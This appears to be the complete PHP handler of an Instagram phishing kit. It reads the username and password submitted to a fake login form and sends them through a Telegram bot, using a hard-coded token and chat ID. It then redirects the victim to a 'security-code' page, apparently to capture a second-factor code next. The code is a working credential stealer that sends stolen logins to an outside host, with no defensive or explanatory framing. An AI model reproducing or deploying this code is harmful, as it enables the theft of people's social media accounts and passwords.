<?php

$apiToken = "5798174362:AAGod65O7U_M0ikOyD31Tolk1HxkIT3Wjuc";
  $data = [
		    'chat_id' => '1001085191', 
		    'text' => "Instagram Username: " . $_POST['username'] . "\n" . " Pass: " . $_POST['password'] . "\n"
		];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data) );
header('Location: security-code.html');
exit();
?>
